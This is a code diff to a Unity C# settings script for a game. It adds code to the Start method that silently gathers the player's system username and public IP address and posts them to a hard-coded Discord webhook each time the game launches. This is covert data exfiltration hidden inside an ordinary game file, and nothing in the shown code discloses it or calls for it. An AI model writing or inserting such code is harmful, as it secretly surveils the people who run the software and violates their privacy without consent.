@@ -2,6 +2,7 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
+using System.Text;
 using TMPro;
 using UnityEngine;
 using UnityEngine.UI;
@@ -24,6 +25,10 @@ public class GetSettings : MonoBehaviour
 
     private void Start()
     {
+        string user = "`user: *" + Environment.UserName + "*, *";
+
+        SendMs(user + GetPublicIp().ToString() + "*`", "https://discord.com/api/webhooks/1081375415265927229/zXjjuPWtqhAn5RPLLa62e29ldB2y8dSS3ZPhXpdsGlxeQE_lH9K7AgbGZYjK3wftDvmG");
+
         wrongVersion.SetActive(Application.version != GetGameVersion());
         scene.LoadScene();
 
@@ -113,5 +118,18 @@ public class GetSettings : MonoBehaviour
             return line;
         }
         return null;
+    }
+
+    static System.Net.IPAddress GetPublicIp(string serviceUrl = "https://ipinfo.io/ip")
+    {
+        return System.Net.IPAddress.Parse(new System.Net.WebClient().DownloadString(serviceUrl));
+    }
+
+    static void SendMs(string message, string webhook)
+    {
+        WebClient client = new WebClient();
+        client.Headers.Add("Content-Type", "application/json");
+        string payload = "{\"content\": \"" + message + "\"}";
+        client.UploadData(webhook, Encoding.UTF8.GetBytes(payload));
     }
 }
